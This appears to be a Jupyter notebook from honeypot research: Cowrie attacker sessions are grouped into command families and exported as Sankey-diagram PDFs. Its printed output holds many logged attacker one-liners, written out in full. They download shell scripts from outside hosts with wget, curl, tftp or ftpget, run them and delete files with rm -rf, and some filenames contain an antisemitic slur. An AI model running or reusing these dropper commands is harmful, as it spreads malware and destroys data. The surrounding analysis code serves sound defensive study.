# --- session ef171c915473 | n_rows=1 | fi_hash=b1791777be4c8ea5 ---
# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; curl http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
# --- session f98012e3896e | n_rows=1 | fi_hash=b1791777be4c8ea5 ---
# cd /tmp || cd /run || cd /; wget http://3.90.219.71/Dynabins.sh; curl http://3.90.219.71/Dynabins.sh; chmod 777 Dynabins.sh; sh Dynabins.sh; tftp 3.90.219.71 -c get Dynatftp1.sh; chmod 777 Dynatftp1.sh; sh Dynatftp1.sh; tftp -r Dynatftp2.sh -g 3.90.219.71; chmod 777 Dynatftp2.sh; sh Dynatftp2.sh; rm -rf Dynabins.sh Dynatftp1.sh Dynatftp2.sh; rm -fr *
#
# ### FI class cd5c93af44ede945 — 11 sessions
# --- session 20f0b2c5550a | n_rows=1 | fi_hash=cd5c93af44ede945 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.75.53/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 104.244.75.53 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.244.75.53; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.244.75.53 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
# --- session 3a1572f1a586 | n_rows=1 | fi_hash=cd5c93af44ede945 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.75.53/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 104.244.75.53 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.244.75.53; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.244.75.53 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
# --- session 70512d57e2a6 | n_rows=1 | fi_hash=cd5c93af44ede945 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.75.53/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 104.244.75.53 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.244.75.53; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.244.75.53 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
# --- session 7eff69145d6a | n_rows=1 | fi_hash=cd5c93af44ede945 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.75.53/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 104.244.75.53 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.244.75.53; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.244.75.53 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
# --- session a28b53d8c883 | n_rows=1 | fi_hash=cd5c93af44ede945 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.75.53/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 104.244.75.53 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.244.75.53; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.244.75.53 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
# --- session a2d587229341 | n_rows=1 | fi_hash=cd5c93af44ede945 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.75.53/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 104.244.75.53 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.244.75.53; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.244.75.53 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
# --- session c7a4653820c0 | n_rows=1 | fi_hash=cd5c93af44ede945 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.75.53/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 104.244.75.53 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.244.75.53; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.244.75.53 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
# --- session d0dd90e897c1 | n_rows=1 | fi_hash=cd5c93af44ede945 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.75.53/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 104.244.75.53 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.244.75.53; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.244.75.53 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
# --- session d5253912ca1a | n_rows=1 | fi_hash=cd5c93af44ede945 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.75.53/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 104.244.75.53 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.244.75.53; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.244.75.53 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
# --- session e50e54b21f36 | n_rows=1 | fi_hash=cd5c93af44ede945 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.75.53/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 104.244.75.53 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.244.75.53; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.244.75.53 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
# --- session e6bb108b5caf | n_rows=1 | fi_hash=cd5c93af44ede945 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.244.75.53/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 104.244.75.53 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.244.75.53; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.244.75.53 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
#
# ### FI class f7f98db3d5ed5589 — 27 sessions
# --- session 0552b68fb171 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mnoger.cf/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp mnoger.cf -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g mnoger.cf; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session 0d7b5221cd18 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://beautypluspartner.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp beautypluspartner.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g beautypluspartner.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session 1db94a8a7114 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://masarotunda.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp masarotunda.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g masarotunda.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session 30d6e3bd7401 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://beautypluspartner.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp beautypluspartner.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g beautypluspartner.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session 435633ca33b0 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mnoger.cf/mn0g3r.sh; chmod 777 mn0g3r.sh; sh mn0g3r.sh; tftp mnoger.cf -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g mnoger.cf; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session 4be051e28f28 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://masarotunda.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp masarotunda.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g masarotunda.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session 5529d8e4f7b9 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mnoger.cf/mn0g3r.sh; chmod 777 mn0g3r.sh; sh mn0g3r.sh; tftp mnoger.cf -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g mnoger.cf; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session 683113ca261a | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mnoger.cf/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp mnoger.cf -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g mnoger.cf; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session 6a80eaf23e91 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://masarotunda.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp masarotunda.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g masarotunda.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session 6ca72a2b2956 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://beautypluspartner.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp beautypluspartner.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g beautypluspartner.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session 7219277ac1c3 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mnoger.cf/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp mnoger.cf -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g mnoger.cf; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session 818b7ba8b4b8 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://masarotunda.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp masarotunda.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g masarotunda.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session 87b0eb9da0ff | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mnoger.cf/mn0g3r.sh; chmod 777 mn0g3r.sh; sh mn0g3r.sh; tftp mnoger.cf -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g mnoger.cf; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session 956458069f64 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://beautypluspartner.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp beautypluspartner.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g beautypluspartner.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session a3e363fb460b | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://masarotunda.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp masarotunda.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g masarotunda.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session aca2b3e7481a | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://beautypluspartner.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp beautypluspartner.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g beautypluspartner.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session ae0f0c3713dd | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://beautypluspartner.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp beautypluspartner.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g beautypluspartner.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session afb34a769ca8 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://mnoger.cf/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp mnoger.cf -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g mnoger.cf; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session b0a67c837ac1 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://beautypluspartner.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp beautypluspartner.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g beautypluspartner.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session b980b67d3bc6 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://masarotunda.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp masarotunda.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g masarotunda.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session be77308ad6b3 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://horseriding3d.tk/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp horseriding3d.tk -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g horseriding3d.tk; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session c6f343d6ea4a | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://masarotunda.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp masarotunda.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g masarotunda.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session d7f1047af056 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://beautypluspartner.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp beautypluspartner.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g beautypluspartner.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session d950f8699ca8 | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://beautypluspartner.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp beautypluspartner.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g beautypluspartner.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session e0ab095d75fb | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://beautypluspartner.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp beautypluspartner.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g beautypluspartner.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session ee3bb059478c | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://horseriding3d.tk/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp horseriding3d.tk -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g horseriding3d.tk; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
# --- session f75b346ce67f | n_rows=1 | fi_hash=f7f98db3d5ed5589 ---
# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://beautypluspartner.ml/mnoger.sh; chmod 777 mnoger.sh; sh mnoger.sh; tftp beautypluspartner.ml -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g beautypluspartner.ml; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *

# %%
# Override: Family ID export (Sankey PDF)
fam_ids = [5]
print(f"Exporting {fam_ids}")
# Out:
# Exporting [5]

# %%
import io
import matplotlib.pyplot as plt
from matplotlib.backends.backend_pdf import PdfPages
import plotly.io as pio

# ---------------------------------------------------------------------
# Sanity checks + basic config
# ---------------------------------------------------------------------
REQUIRED_GLOBALS = ["ROOT", "DATASET", "fi_df", "summ_df", "family_members_df", "archetypes"]
missing = [name for name in REQUIRED_GLOBALS if name not in globals()]
if missing:
    raise RuntimeError(
        f"Missing required objects in scope: {missing}. "
        "Expected ROOT, DATASET, fi_df, summ_df, family_members_df, archetypes."
    )

DATASET_NAME = Path(DATASET).stem
out_dir = ROOT / "projects" / "fi_fs" / "data" / "output" / DATASET_NAME
out_dir.mkdir(parents=True, exist_ok=True)
OUTPUT_PDF = out_dir / f"{DATASET_NAME}_FS_families_sankey.pdf"

# Detect a commands column on fi_df for session lookups
CMD_COL_CANDIDATES = ["commands_clean", "commands_joined", "commands"]
cmd_col = next((c for c in CMD_COL_CANDIDATES if c in fi_df.columns), None)
if cmd_col is None:
    raise KeyError(
        "No commands column found in fi_df. "
        f"Looked for: {CMD_COL_CANDIDATES}. "
        f"Got: {list(fi_df.columns)}"
    )

# We will use session + fi_hash to join back from archetypes to fi_df
fi_df_norm = fi_df.assign(
    session=lambda df: df["session"].astype(str),
    fi_hash=lambda df: df["fi_hash"].astype(str),
)

# ---------------------------------------------------------------------
# Families to export
#   - If `fam_ids` already exists: use it (demo mode).
#   - Otherwise: default to ALL families with size > 1.
# ---------------------------------------------------------------------
if "fam_ids" in globals() and fam_ids:
    print(f"Using pre-set fam_ids: {fam_ids}")
else:
    fam_ids = (
        summ_df.loc[summ_df["size"] > 1, "family_id"]
               .astype(int)
               .tolist()
    )
    print(f"Exporting ALL {len(fam_ids)} FS families (excluding singletons)")

# Output PDF naming
if len(fam_ids) == 1:
    OUTPUT_PDF = out_dir / f"{DATASET_NAME}_FS_family_{fam_ids[0]}_sankey.pdf"
else:
    OUTPUT_PDF = out_dir / f"{DATASET_NAME}_FS_families_sankey.pdf"

print("Output PDF:", OUTPUT_PDF.relative_to(ROOT))


# ---------------------------------------------------------------------
# Helper: build per-family commands text (up to 5 sessions)
# ---------------------------------------------------------------------
def build_commands_block(family_id: int,
                         max_sessions: int = 5,
                         max_lines_per_session: int = 3) -> str:
    """
    Build a text block with up to `max_sessions` archetype sessions for a family,
    truncating each session to at most `max_lines_per_session` command lines.
    """
    # FI classes (fi_hash) in this FS family
    fam_fi_hashes = (
        family_members_df.loc[family_members_df["family_id"] == family_id, "fi_hash"]
        .astype(str)
        .unique()
        .tolist()
    )
    if not fam_fi_hashes:
        return f"Family {family_id}: no fi_hashes found in family_members_df.\n"

    # Take the archetype rows for this family (one per fi_hash)
    fam_arch = (
        archetypes.loc[archetypes["fi_hash"].astype(str).isin(fam_fi_hashes),
                       ["fi_hash", "session", "n_rows"]]
        .assign(
            fi_hash=lambda df: df["fi_hash"].astype(str),
            session=lambda df: df["session"].astype(str),
        )
    )
    if fam_arch.empty:
        return f"Family {family_id}: no archetype rows found for fi_hashes.\n"

    # Join with fi_df to recover commands for those archetype sessions
    subset = (
        fam_arch.merge(
            fi_df_norm[["session", "fi_hash", cmd_col]],
            on=["session", "fi_hash"],
            how="left",
            suffixes=("", "_fi"),
        )
    )

    if subset[cmd_col].isna().all():
        return (
            f"Family {family_id}: could not find commands in fi_df for any "
            "archetype (session, fi_hash) pairs.\n"
        )

    subset = (
        subset
        .dropna(subset=[cmd_col])
        .rename(columns={cmd_col: "commands_clean"})
        .sort_values(["n_rows", "session"], ascending=[False, True])
        .reset_index(drop=True)
    )

    lines: list[str] = []
    lines.append(f"=== Per-session commands (up to {max_sessions}) ===")
    lines.append(
        f"Family {family_id}: {len(subset)} archetype sessions with commands"
    )

    for _, row in subset.head(max_sessions).iterrows():
        lines.append("")
        lines.append(
            f"--- session {row['session']} | "
            f"n_rows={row['n_rows']} | fi_hash={row['fi_hash']} ---"
        )

        cmds = str(row["commands_clean"])
        pretty = cmds if "\n" in cmds else cmds.replace(" ; ", ";\n")
        cmd_lines = pretty.splitlines()

        if len(cmd_lines) > max_lines_per_session:
            cmd_lines = cmd_lines[:max_lines_per_session] + ["... (truncated)"]

        lines.extend(cmd_lines)

    return "\n".join(lines)


# ---------------------------------------------------------------------
# Generate PDF: one page per family
# ---------------------------------------------------------------------
PDF_DPI = 300
IMAGE_SCALE = 3

with PdfPages(OUTPUT_PDF) as pdf:
    for fam_id in fam_ids:
        print(f"Rendering family {fam_id}...")

        # --- Build family sequences for Sankey from family_members_df ---
        fam_rows = family_members_df.loc[
            family_members_df["family_id"] == fam_id, "struct_tokens"
        ]
        if fam_rows.empty:
            print(f"  Skipping family {fam_id}: no struct_tokens in family_members_df.")
            continue

        family_seqs = [
            parse_structured_tokens(json.loads(s))
            for s in fam_rows
        ]

        # Caption metadata from summ_df + archetypes
        meta_row = summ_df.loc[summ_df["family_id"] == fam_id].iloc[0]
        medoid_idx = int(meta_row["medoid_idx"])
        med = archetypes.iloc[medoid_idx]

        caption = {
            "family_id": fam_id,
            "n_sessions": len(family_seqs),
            "mean_FS": meta_row["mean_FS"],
            "sd_FS": meta_row["sd_FS"],
            "medoid_fi_hash": med["fi_hash"],
            "medoid_session": med["session"],
            "medoid_n_rows": int(med["n_rows"]),
            "top_ops": meta_row["top_ops"],
        }

        # --- Plotly Sankey figure (Lane A / Lev) ---
        fig_sankey, backbone, debug = sankey_from_family_enhanced(
            family_seqs,
            backbone=None,
            title=f"Family {fam_id} — Sankey (WLCS backbone, Lane A / Lev)",
            min_variant_support=0.10,
            topN_variants_per_gap=3,
            variant_label_mode="first",
            normalise_widths=False,
            caption=caption,
        )

        # --- Build commands text block (up to 5 sessions) ---
        text_block = build_commands_block(
            family_id=fam_id,
            max_sessions=5,
            max_lines_per_session=3,   # or 4/5 if you prefer
        )

        # --- Convert Plotly figure to high-res PNG bytes ---
        img_bytes = pio.to_image(
            fig_sankey,
            format="png",
            scale=IMAGE_SCALE,
        )
        img = plt.imread(io.BytesIO(img_bytes))

        # --- Create Matplotlib page: image on top, text underneath ---
        fig = plt.figure(figsize=(11.69, 8.27), dpi=PDF_DPI)  # A4-ish, high DPI
        fig.suptitle(f"Family {fam_id}", fontsize=12)

        # Image area
        ax_img = fig.add_axes([0.05, 0.32, 0.90, 0.63])
        ax_img.axis("off")
        ax_img.imshow(img)

        # Text area
        ax_txt = fig.add_axes([0.05, 0.05, 0.90, 0.23])
        ax_txt.axis("off")
        ax_txt.text(
            0.0,
            1.0,
            text_block,
            ha="left",
            va="top",
            family="monospace",
            fontsize=7,
        )

        pdf.savefig(fig)
        plt.close(fig)

print(f"\nSaved multi-page PDF to {OUTPUT_PDF.relative_to(ROOT)}")
# Out:
# Using pre-set fam_ids: [5]
# Output PDF: projects/fi_fs/data/output/Cowrie/Cowrie_FS_family_5_sankey.pdf
# Rendering family 5...
#
# Saved multi-page PDF to projects/fi_fs/data/output/Cowrie/Cowrie_FS_family_5_sankey.pdf
